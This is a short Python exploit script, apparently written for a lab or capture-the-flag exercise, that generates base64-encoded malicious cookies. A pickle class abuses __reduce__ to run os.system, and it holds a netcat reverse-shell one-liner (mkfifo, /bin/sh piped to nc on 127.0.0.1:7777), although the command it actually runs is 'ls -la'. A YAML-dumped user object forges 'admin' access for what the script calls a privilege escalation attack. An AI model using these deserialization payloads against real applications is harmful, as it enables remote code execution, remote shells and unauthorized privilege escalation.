#!/usr/bin/python3
import pickle
import base64
import os
import yaml

class rce():
  def __reduce__(self):
    reverse_shell_cmd = ('rm /tmp/f; mkfifo /tmp/f;'
            'cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 7777 > /tmp/f')

    ls_cmd = ('ls -la')

    return os.system, (ls_cmd,)

class UserData(yaml.YAMLObject):
  yaml_loader = yaml.SafeLoader
  yaml_tag = u'!User'

  def __init__(self, user, language, access):
      self.user = user
      self.language = language
      self.access = access

  def __str__(self):
      return "user : {}, language: {}, access: {}".format(self.user, self.language, self.access)

  def __reduce__(self):
      ls_cmd = ('ls -la')
      return os.system, (ls_cmd,)

# base64-encode and print the payload
print("cookie for rce")
print(base64.b64encode(pickle.dumps(rce())))

print("cookie for privilege escalation attack")
print(base64.b64encode(yaml.dump(UserData('george', 'en', 'admin')).encode('utf-8')))

